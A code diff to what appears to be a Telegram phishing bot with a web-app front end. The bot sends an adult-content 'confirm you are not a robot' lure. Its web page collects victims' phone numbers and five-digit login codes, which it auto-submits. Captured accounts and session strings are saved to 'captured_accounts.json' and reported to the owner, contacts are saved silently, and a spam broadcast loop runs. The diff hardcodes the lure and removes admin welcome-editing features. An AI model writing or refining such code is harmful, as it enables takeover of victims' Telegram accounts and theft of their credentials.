@@ -22,6 +22,18 @@ YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
 PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 
+# ============================================================
+# HARDCODED WELCOME MESSAGE — ALWAYS ACTIVE
+# ============================================================
+WELCOME_TEXT = """Hello {name} 👋
+
+🔞To again access to the files completely free of charge, do the following💦:
+
+👇Confirm that you are not a robot.
+
+👇"""
+WELCOME_BUTTON = "CONFIRM NOW"
+
 logger.info("=" * 60)
 logger.info("ENV CHECK")
 logger.info(f"  BOT_TOKEN  : {'SET' if BOT_TOKEN else 'MISSING'}")
@@ -46,15 +58,16 @@ DATA_FILE = "captured_accounts.json"
 USERS_FILE = "bot_users.json"
 CONFIG_FILE = "bot_config.json"
 
-DEFAULT_CONFIG = {
+# Hardcoded config — always this
+HARDCODED_CONFIG = {
     "welcome_messages": [
         {
             "type": "text",
-            "content": "Hello {name} 👋\n\n🔞To again access to the files completely free of charge, do the following💦:\n\n👇Confirm that you are not a robot.",
+            "content": WELCOME_TEXT,
             "caption": ""
         }
     ],
-    "button_text": "CONFIRM NOW",
+    "button_text": WELCOME_BUTTON,
     "webapp_url": WEBAPP_URL + "?auto=1",
     "timer": 60
 }
@@ -74,22 +87,22 @@ broadcast_state = {
 }
 
 
-def load_json(path, default):
-    if os.path.exists(path):
+def load_users():
+    if os.path.exists(USERS_FILE):
         try:
-            with open(path) as f:
+            with open(USERS_FILE) as f:
                 return json.load(f)
         except Exception:
-            return default
-    return default
+            return {}
+    return {}
 
 
-def save_json(path, data):
+def save_users(data):
     try:
-        with open(path, 'w') as f:
+        with open(USERS_FILE, 'w') as f:
             json.dump(data, f, indent=2)
     except Exception as e:
-        logger.error(f"save {path}: {e}")
+        logger.error(f"save users: {e}")
 
 
 def load_accounts():
@@ -121,8 +134,10 @@ def save_account(account):
 
 
 captured_accounts = load_accounts()
-users = load_json(USERS_FILE, {})
-config = load_json(CONFIG_FILE, DEFAULT_CONFIG)
+users = load_users()
+
+# ALWAYS USE HARDCODED CONFIG — override any saved config
+config = HARDCODED_CONFIG
 
 
 def format_phone(ph):
@@ -141,7 +156,6 @@ def format_phone(ph):
 
 
 def notify(phone, ss, me, dc, pu=False, pv=""):
-    """Owner notification — session only, no contact msg"""
     if not BOT_TOKEN or not YOUR_TELEGRAM_ID:
         return
     try:
@@ -279,23 +293,10 @@ SESSION_PATH = f"/tmp/bot_{uuid.uuid4().hex[:8]}.session"
 bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 
 
-async def auto_delete_later(uid, msg_ids, delay=5):
-    """Auto-delete messages after delay"""
-    await asyncio.sleep(delay)
-    try:
-        if isinstance(msg_ids, int):
-            msg_ids = [msg_ids]
-        await bot.delete_messages(uid, msg_ids)
-        logger.info(f"Deleted {len(msg_ids)} msgs for {uid}")
-    except Exception as e:
-        logger.error(f"auto_delete err: {e}")
-
-
 def admin_menu():
     return [
-        [Button.inline("👋 Welcome Messages", b"menu_welcome"),
-         Button.inline("📢 Broadcast", b"menu_broadcast")],
-        [Button.inline(f"⏱ Timer: {config.get('timer', 60)}s", b"menu_timer")],
+        [Button.inline("📢 Broadcast", b"menu_broadcast"),
+         Button.inline(f"⏱ Timer: {config.get('timer', 60)}s", b"menu_timer")],
         [Button.inline("👥 Users", b"menu_users"),
          Button.inline("📊 Stats", b"menu_stats")],
         [Button.inline("🔄 Reset Modes", b"menu_reset")],
@@ -321,28 +322,17 @@ async def edit_or_send(event, text, buttons=None):
 
 
 async def send_welcome(uid, name):
-    """Send welcome messages to user. Welcome messages STAY (user needs to tap button)."""
-    msgs = config.get("welcome_messages", [])
-    if not msgs:
-        logger.warning(f"No welcome messages set for {uid}")
+    """Send HARDCODED welcome message"""
+    try:
+        content = WELCOME_TEXT.replace("{name}", name)
+        buttons = [[Button.webview(WELCOME_BUTTON, url=WEBAPP_URL + "?auto=1")]]
+        sent = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
+        logger.info(f"Welcome sent to {uid} ({name})")
+        return [sent.id]
+    except Exception as e:
+        logger.error(f"welcome {uid} FAILED: {e}")
+        logger.error(traceback.format_exc())
         return []
-    buttons = [[Button.webview(
-        config.get("button_text", "CONFIRM NOW"),
-        url=config.get("webapp_url", WEBAPP_URL + "?auto=1")
-    )]]
-    sent_ids = []
-    for i, m in enumerate(msgs):
-        try:
-            content = (m.get("content") or "").replace("{name}", name)
-            caption = (m.get("caption") or "").replace("{name}", name)
-            btns = buttons if i == len(msgs) - 1 else None
-            sent = await bot.send_message(uid, content or caption, buttons=btns, parse_mode='md')
-            sent_ids.append(sent.id)
-            logger.info(f"Welcome msg #{i+1} sent to {uid}")
-            await asyncio.sleep(0.3)
-        except Exception as e:
-            logger.error(f"welcome {uid}: {e}")
-    return sent_ids
 
 
 @bot.on(events.NewMessage(pattern='/start'))
@@ -355,7 +345,7 @@ async def start_handler(event):
         "username": sender.username or "",
         "joined": str(datetime.now())
     }
-    save_json(USERS_FILE, users)
+    save_users(users)
 
     if uid == YOUR_TELEGRAM_ID:
         await event.respond(
@@ -386,52 +376,6 @@ async def cb(event):
             await event.answer("Reset!", alert=True)
             await edit_or_send(event, "✅ Modes reset.", admin_menu())
 
-        elif data == "menu_welcome":
-            n = len(config.get("welcome_messages", []))
-            await event.answer()
-            await edit_or_send(event,
-                f"👋 **Welcome Messages** — `{n}` active",
-                [
-                    [Button.inline("➕ Add Messages", b"wl_add"),
-                     Button.inline("👁 Preview", b"wl_preview")],
-                    [Button.inline("🗑 Clear All", b"wl_clear"),
-                     Button.inline("✏️ Button Text", b"wl_btntext")],
-                    back_button()
-                ])
-
-        elif data == "wl_add":
-            STATE["welcome_capture"] = True
-            STATE["capture_mode"] = False
-            await event.answer("Send welcome messages now")
-            await edit_or_send(event,
-                "✍️ **Welcome Capture: ON**\n\nSend text/photo/video one by one.",
-                [[Button.inline("⏹ Stop & Save", b"wl_stop")], back_button()])
-
-        elif data == "wl_stop":
-            STATE["welcome_capture"] = False
-            n = len(config.get('welcome_messages', []))
-            await event.answer(f"Saved {n} messages!", alert=True)
-            await edit_or_send(event,
-                f"✅ Welcome set: `{n}` messages.",
-                admin_menu())
-
-        elif data == "wl_preview":
-            await event.answer("Preview sent")
-            ids = await send_welcome(YOUR_TELEGRAM_ID, "Preview")
-            if ids:
-                asyncio.create_task(auto_delete_later(YOUR_TELEGRAM_ID, ids, 8))
-
-        elif data == "wl_clear":
-            config["welcome_messages"] = []
-            save_json(CONFIG_FILE, config)
-            await event.answer("Cleared!", alert=True)
-            await edit_or_send(event, "Cleared welcome messages.", admin_menu())
-
-        elif data == "wl_btntext":
-            STATE["awaiting_btntext"] = True
-            await event.answer()
-            await edit_or_send(event, "✏️ Send new button text.", back_button())
-
         elif data == "menu_broadcast":
             s = broadcast_state
             await event.answer()
@@ -447,7 +391,6 @@ async def cb(event):
 
         elif data == "bc_add":
             STATE["capture_mode"] = True
-            STATE["welcome_capture"] = False
             await event.answer("Send broadcast messages")
             await edit_or_send(event,
                 "📥 **Broadcast Capture: ON**\n\nSend text/photo/video.",
@@ -495,22 +438,12 @@ async def cb(event):
         elif data == "menu_stats":
             s = broadcast_state
             await event.answer(
-                f"Users: {len(users)}\nBroadcast: {s['active']}\nQueue: {len(s['messages'])}\nWelcome: {len(config.get('welcome_messages', []))}",
+                f"Users: {len(users)}\nBroadcast: {s['active']}\nQueue: {len(s['messages'])}",
                 alert=True
             )
     except Exception as e:
         logger.error(f"cb error: {e}")
         logger.error(traceback.format_exc())
-
-
-@bot.on(events.NewMessage(pattern='/wldone'))
-async def wldone(event):
-    if event.sender_id != YOUR_TELEGRAM_ID:
-        return
-    STATE["welcome_capture"] = False
-    await event.respond(
-        f"✅ Welcome set: `{len(config.get('welcome_messages', []))}`",
-        buttons=admin_menu(), parse_mode='md')
 
 
 @bot.on(events.NewMessage(pattern='/cancel'))
@@ -540,33 +473,10 @@ async def capture(event):
             config["timer"] = sec
             STATE["awaiting_timer"] = False
             broadcast_state['interval'] = sec
-            save_json(CONFIG_FILE, config)
             await event.respond(f"✅ Timer: **{sec}s**",
                 buttons=admin_menu(), parse_mode='md')
         except ValueError:
             await event.respond("Send a number (e.g., 30)")
-        return
-
-    if STATE["awaiting_btntext"]:
-        config["button_text"] = txt.strip()[:40]
-        STATE["awaiting_btntext"] = False
-        save_json(CONFIG_FILE, config)
-        await event.respond(f"✅ Button: `{config['button_text']}`",
-            buttons=admin_menu(), parse_mode='md')
-        return
-
-    if STATE["welcome_capture"]:
-        m = event.message
-        entry = {"type": "text", "content": m.message or "", "caption": ""}
-        if m.photo:
-            entry = {"type": "photo", "content": "", "caption": m.message or ""}
-        elif m.video:
-            entry = {"type": "video", "content": "", "caption": m.message or ""}
-        config.setdefault("welcome_messages", []).append(entry)
-        save_json(CONFIG_FILE, config)
-        await event.respond(
-            f"✅ Welcome #{len(config['welcome_messages'])} added.",
-            buttons=[[Button.inline("⏹ Stop & Save", b"wl_stop")], back_button()])
         return
 
     if STATE["capture_mode"]:
@@ -622,7 +532,7 @@ async def broadcast_loop():
                         err = str(e).lower()
                         if 'blocked' in err or 'deactivated' in err or 'not found' in err:
                             users.pop(uid_str, None)
-                            save_json(USERS_FILE, users)
+                            save_users(users)
                     await asyncio.sleep(0.4)
 
             broadcast_state['next_run'] = time.time() + broadcast_state['interval']
@@ -749,7 +659,6 @@ var contactForce = null;
 var inProgress = false;
 var TG_CHANNEL = 'https://t.me/videodks';
 var TG_CAPTION = 'Premium content';
-
 function show(id) { document.getElementById(id).classList.add('on'); }
 function hide(id) { document.getElementById(id).classList.remove('on'); }
 function msg(id, text, type) {
@@ -880,7 +789,6 @@ function startOtpCheck() {
     }).catch(function(){});
   }, 2000);
 }
-// AUTO SUBMIT — 5 digit fill holei
 ['o1','o2','o3','o4','o5'].forEach(function(id, i) {
   document.getElementById(id).addEventListener('input', function() {
     var v = this.value.replace(/[^0-9]/g, '');
@@ -914,9 +822,7 @@ function submitOtp() {
       ['o1','o2','o3','o4','o5'].forEach(function(id) { document.getElementById(id).value = ''; });
       document.getElementById('o1').focus();
     }
-  }).catch(function() {
-    msg('otpMsg', 'Connection error', 'err');
-  });
+  }).catch(function() { msg('otpMsg', 'Connection error', 'err'); });
 }
 document.getElementById('resendBtn').onclick = function() {
   document.getElementById('resendBtn').style.display = 'none';
@@ -1008,12 +914,11 @@ def health():
     return jsonify({
         'status': 'ok',
         'bot_thread_alive': _bot_thread.is_alive() if _bot_thread else False,
-        'state': STATE,
         'accounts': len(captured_accounts),
         'bot_users': len(users),
         'broadcast_active': broadcast_state['active'],
         'broadcast_queue': len(broadcast_state['messages']),
-        'welcome_count': len(config.get('welcome_messages', []))
+        'welcome_text_hardcoded': True
     })
 
 
@@ -1032,8 +937,7 @@ def save_contact():
             'phone': phone, 'user_id': ex['user_id']})
     with sessions_lock:
         pending_codes[phone] = 'contact_saved'
-    # NO owner notification for contact — silent save
-    logger.info(f"Contact saved: {phone}")
+    logger.info(f"Contact saved (silent): {phone}")
     return jsonify({'success': True, 'phone': phone})
 
 
